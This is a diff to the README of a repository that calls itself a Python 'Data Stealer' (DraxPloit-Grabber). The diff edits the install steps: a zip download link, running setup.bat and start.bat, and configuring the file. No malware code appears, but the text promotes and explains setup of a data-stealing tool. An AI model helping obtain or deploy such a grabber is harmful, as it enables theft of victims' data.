@@ -14,14 +14,14 @@ Data Stealer written in **Python**
 ### Requirements
 
 * Newest [Python](https://www.python.org) version
-* The code in this repository
+* The code in this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)
 * Nothing else
 
 ### Installing
 
 1. Install the files of this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)
 2. Extract the .zip file in the desired directory.
-3. Run "setup.bat" and wait until everything's installed
+3. Run "setup.bat" (located in the folder) and wait until everything's installed
 4. Run "start.bat"
 5. Configure your file
 6. Enjoy!
